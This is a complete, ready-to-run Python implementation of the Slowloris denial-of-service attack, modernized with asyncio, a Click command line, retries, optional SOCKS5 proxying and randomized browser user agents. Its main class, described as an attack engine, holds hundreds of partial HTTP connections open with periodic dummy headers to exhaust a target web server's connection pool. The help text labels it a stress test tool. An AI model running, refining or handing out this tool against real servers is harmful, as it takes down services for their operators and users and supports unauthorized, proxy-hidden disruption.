#!/usr/bin/env python3
"""Slowloris - Low bandwidth DoS tool rewritten with modern Python practices.

This implementation uses asyncio for maximum concurrent connection handling,
proper resource management, and clean architecture without monkey-patching.

Features modernized:
- Click for CLI (instead of argparse)
- Structlog for structured logging
- Tenacity for retries
- Enhanced SSL/TLS settings
- Async context managers for connections
- Asyncio-native signal handlers
- Enhanced dataclass with validators
"""

from __future__ import annotations

import asyncio
import signal
import socket
import ssl
import sys
from dataclasses import dataclass, field
from typing import Optional, Set

# Modern CLI package
import click

# Structured logging
import structlog

# Retry logic with tenacity
from tenacity import (
    retry,
    stop_after_attempt,
    wait_exponential,
    retry_if_exception_type,
)

__version__ = "0.3.1"

# Configure structlog with console output
structlog.configure(
    processors=[
        structlog.stdlib.filter_by_level,
        structlog.stdlib.add_logger_name,
        structlog.stdlib.add_log_level,
        structlog.stdlib.PositionalArgumentsFormatter(),
        structlog.processors.TimeStamper(fmt="%d-%m-%Y %H:%M:%S"),
        structlog.processors.StackInfoRenderer(),
        structlog.processors.format_exc_info,
        structlog.processors.UnicodeDecoder(),
        structlog.dev.ConsoleRenderer(),
    ],
    context_class=dict,
    logger_factory=structlog.stdlib.LoggerFactory(),
    cache_logger_on_first_use=True,
    wrapper_class=structlog.stdlib.BoundLogger,
)

log = structlog.get_logger()


# Modern user agents (2024) - Using tuple for immutability
USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
)

# Optional SOCKS5 support
_PROXY_AVAILABLE = False

# Use TYPE_CHECKING to satisfy type checkers without runtime import issues
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from python_socks import ProxyType
    from python_socks.async_.asyncio import Proxy
else:
    # Runtime: try import, keep as None if unavailable
    Proxy = None  # type: ignore
    ProxyType = None  # type: ignore
    try:
        from python_socks import ProxyType
        from python_socks.async_.asyncio import Proxy
        _PROXY_AVAILABLE = True
    except ImportError:
        pass


# Enhanced Config with validators using dataclass field
@dataclass(frozen=True)
class Config:
    """Configuration for Slowloris attack with validation."""
    host: str
    port: int = 80
    sockets: int = 150
    verbose: bool = False
    randuseragent: bool = False
    useproxy: bool = False
    proxy_host: str = "127.0.0.1"
    proxy_port: int = 8080
    https: bool = False
    sleeptime: float = 15.0
    jitter: float = 3.0
    
    # Post-initialization validation
    def __post_init__(self) -> None:
        """Validate configuration after initialization."""
        if not self.host:
            raise ValueError("Host cannot be empty")
        if not 1 <= self.port <= 65535:
            raise ValueError(f"Port must be between 1 and 65535, got {self.port}")
        if self.sockets < 1:
            raise ValueError(f"Sockets must be at least 1, got {self.sockets}")
        if self.sleeptime <= 0:
            raise ValueError(f"Sleeptime must be positive, got {self.sleeptime}")
        if self.jitter < 0:
            raise ValueError(f"Jitter must be non-negative, got {self.jitter}")
    
    def to_dict(self) -> dict:
        """Convert config to dictionary for serialization."""
        return {
            "host": self.host,
            "port": self.port,
            "sockets": self.sockets,
            "verbose": self.verbose,
            "randuseragent": self.randuseragent,
            "useproxy": self.useproxy,
            "proxy_host": self.proxy_host,
            "proxy_port": self.proxy_port,
            "https": self.https,
            "sleeptime": self.sleeptime,
            "jitter": self.jitter,
        }


class Slowloris:
    """Asyncio-based Slowloris attack engine.
    
    Manages multiple concurrent connections to exhaust a target server's
    connection pool by sending partial HTTP requests and keeping them alive
    with periodic dummy headers.
    """
    
    def __init__(self, config: Config) -> None:
        self.config = config
        self._shutdown = asyncio.Event()
        self._tasks: Set[asyncio.Task[None]] = set()
        self._ssl: Optional[ssl.SSLContext] = None
        
        # Enhanced SSL context with TLS 1.3 support
        if config.https:
            self._ssl = self._create_ssl_context()
        
        # Statistics
        self._connections_created = 0
        self._connections_failed = 0
    
    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create enhanced SSL context with modern TLS settings."""
        # Use TLS 1.3 if available, fallback to TLS 1.2
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        
        # Modern security settings
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # Enable TLS 1.3 (default in Python 3.8+)
        # Min version TLS 1.2 for compatibility
        try:
            ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        except AttributeError:
            # Python < 3.8 fallback
            pass
        
        # Set secure ciphers
        try:
            ssl_context.set_ciphers(
                "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:"
                "!aNULL:!MD5:!DSS"
            )
        except ssl.SSLError:
            # Some systems may not support custom ciphers
            pass
        
        return ssl_context
    
    @retry(
        stop=stop_after_attempt(3),
        wait=wait_exponential(multiplier=1, min=1, max=10),
        retry=retry_if_exception_type((OSError, ConnectionRefusedError)),
        reraise=True,
    )
    async def _open_connection(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """Establish a connection to the target, optionally via SOCKS5 proxy.
        
        Uses tenacity for automatic retry with exponential backoff.
        """
        if self.config.useproxy:
            if not _PROXY_AVAILABLE:
                raise RuntimeError(
                    "SOCKS5 proxy support requires 'python-socks' package. "
                    "Install it with: pip install python-socks"
                )
            proxy = Proxy.create(
                proxy_type=ProxyType.SOCKS5,
                host=self.config.proxy_host,
                port=self.config.proxy_port,
            )
            sock = await proxy.connect(
                dest_host=self.config.host,
                dest_port=self.config.port,
                timeout=10,
            )
            return await asyncio.wait_for(
                asyncio.open_connection(sock=sock, ssl=self._ssl),
                timeout=10.0,
            )
        
# Resolve address with IPv6 support
        addrinfo = socket.getaddrinfo(
            self.config.host,
            self.config.port,
            socket.AF_UNSPEC,
            socket.SOCK_STREAM,
        )
        
        last_error: Optional[Exception] = None
        for family, socktype, proto, canonname, sockaddr in addrinfo:
            try:
                host_addr: str = str(sockaddr[0])  # Cast to str for type safety
                return await asyncio.wait_for(
                    asyncio.open_connection(
                        host_addr, 
                        self.config.port, 
                        ssl=self._ssl
                    ),
                    timeout=10.0,
                )
            except OSError as e:
                last_error = e
                continue
        
        if last_error:
            raise last_error
        raise OSError(f"Could not connect to {self.config.host}:{self.config.port}")
    
    def _get_user_agent(self) -> str:
        """Return a user agent string."""
        if self.config.randuseragent:
            import random
            return random.choice(USER_AGENTS)
        return USER_AGENTS[0]
    
    async def _send_initial_request(self, writer: asyncio.StreamWriter) -> None:
        """Send the initial partial HTTP request."""
        import random
        query = random.randint(0, 9999)
        lines = [
            f"GET /?{query} HTTP/1.1\r\n",
            f"Host: {self.config.host}\r\n",
            f"User-Agent: {self._get_user_agent()}\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Connection: keep-alive\r\n",
        ]
        for line in lines:
            writer.write(line.encode())
        await writer.drain()
    
    async def _worker(self) -> None:
        """Maintain a single Slowloris connection."""
        import random
        import secrets
        
        while not self._shutdown.is_set():
            writer: Optional[asyncio.StreamWriter] = None
            try:
                # Use async context manager for automatic cleanup
                reader, writer = await self._open_connection()
                self._connections_created += 1
                await self._send_initial_request(writer)
                
                while not self._shutdown.is_set():
                    # Send keep-alive header
                    if writer and not writer.is_closing():
                        # Use secrets for cryptographic randomness
                        header_val = secrets.randbelow(5000) + 1
                        writer.write(f"X-a: {header_val}\r\n".encode())
                        await writer.drain()
                    
                    # Calculate sleep time with jitter
                    if self.config.jitter > 0:
                        sleep_time = self.config.sleeptime + random.uniform(
                            -self.config.jitter, 
                            self.config.jitter
                        )
                    else:
                        sleep_time = self.config.sleeptime
                    
                    # Wait with early exit on shutdown
                    try:
                        await asyncio.wait_for(
                            self._shutdown.wait(),
                            timeout=sleep_time
                        )
                    except asyncio.TimeoutError:
                        pass  # Normal timeout, continue loop
                    
                    # Check if connection was closed by server
                    if writer and writer.is_closing():
                        break
                        
            except asyncio.TimeoutError:
                self._connections_failed += 1
                log.debug("Connection timeout", host=self.config.host)
            except ConnectionRefusedError:
                self._connections_failed += 1
                log.debug("Connection refused", host=self.config.host)
            except OSError as e:
                self._connections_failed += 1
                log.debug("Connection error", host=self.config.host, error=str(e))
            except RuntimeError as e:
                log.error("Runtime error", error=str(e))
                raise
            except Exception as e:
                log.debug("Unexpected error", error=str(e))
            finally:
                # Use async context manager pattern for proper cleanup
                if writer and not writer.is_closing():
                    writer.close()
                    await writer.wait_closed()
            
            # Exponential backoff is handled by tenacity decorator
            if not self._shutdown.is_set():
                await asyncio.sleep(1.0)
    
    async def run(self) -> None:
        """Run the Slowloris attack."""
        log.info(
            "Starting attack",
            host=self.config.host,
            port=self.config.port,
            sockets=self.config.sockets,
        )
        
        # Create worker tasks
        for _ in range(self.config.sockets):
            task = asyncio.create_task(self._worker())
            self._tasks.add(task)
            task.add_done_callback(self._tasks.discard)
        
        # Wait for shutdown signal
        await self._shutdown.wait()
        
        # Graceful shutdown
        log.info("Shutting down connections")
        for task in self._tasks:
            task.cancel()
        
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)
        
        log.info(
            "Attack complete",
            connections_created=self._connections_created,
            connections_failed=self._connections_failed,
        )
    
    def stop(self) -> None:
        """Signal shutdown."""
        self._shutdown.set()


# Modern CLI using Click instead of argparse
@click.command()
@click.argument("host", required=False)
@click.option(
    "-p", "--port",
    default=80,
    type=int,
    help="Port of webserver, usually 80 or 443",
)
@click.option(
    "-s", "--sockets",
    default=150,
    type=int,
    help="Number of concurrent connections to maintain",
)
@click.option(
    "-v", "--verbose",
    is_flag=True,
    help="Enable verbose logging",
)
@click.option(
    "-ua", "--randuseragents",
    is_flag=True,
    help="Randomize user-agent for each connection",
)
@click.option(
    "-x", "--useproxy",
    is_flag=True,
    help="Use SOCKS5 proxy for connections",
)
@click.option(
    "--proxy-host",
    default="127.0.0.1",
    help="SOCKS5 proxy host (default: 127.0.0.1)",
)
@click.option(
    "--proxy-port",
    default=8080,
    type=int,
    help="SOCKS5 proxy port (default: 8080)",
)
@click.option(
    "--https",
    is_flag=True,
    help="Use HTTPS for connections",
)
@click.option(
    "--sleeptime",
    default=15,
    type=float,
    help="Seconds between keep-alive headers (default: 15)",
)
@click.option(
    "--jitter",
    default=3,
    type=float,
    help="Random jitter added to sleep time (default: 3)",
)
@click.version_option(version=__version__)
def main(
    host: Optional[str],
    port: int,
    sockets: int,
    verbose: bool,
    randuseragents: bool,
    useproxy: bool,
    proxy_host: str,
    proxy_port: int,
    https: bool,
    sleeptime: float,
    jitter: float,
) -> None:
    """Slowloris - Low bandwidth stress test tool for websites."""
    
    if not host:
        click.echo(click.get_current_context().get_help())
        sys.exit(1)
    
    # Create config with validation
    try:
        config = Config(
            host=host,
            port=port,
            sockets=sockets,
            verbose=verbose,
            randuseragent=randuseragents,
            useproxy=useproxy,
            proxy_host=proxy_host,
            proxy_port=proxy_port,
            https=https,
            sleeptime=sleeptime,
            jitter=jitter,
        )
    except ValueError as e:
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)
    
    # Setup asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    slowloris = Slowloris(config)
    
    # Use asyncio-native signal handling
    def signal_handler() -> None:
        log.info("Received interrupt signal, shutting down")
        slowloris.stop()
    
    # Register signal handlers using asyncio native method
    try:
        loop.add_signal_handler(signal.SIGINT, signal_handler)
        loop.add_signal_handler(signal.SIGTERM, signal_handler)
    except NotImplementedError:
        # Windows doesn't support add_signal_handler
        import signal as sig
        sig.signal(sig.SIGINT, lambda s, f: signal_handler())
        sig.signal(sig.SIGTERM, lambda s, f: signal_handler())
    
    try:
        loop.run_until_complete(slowloris.run())
    except KeyboardInterrupt:
        log.info("Interrupted, shutting down")
        slowloris.stop()
        loop.run_until_complete(asyncio.sleep(0.5))
    finally:
        loop.close()


if __name__ == "__main__":
    main()
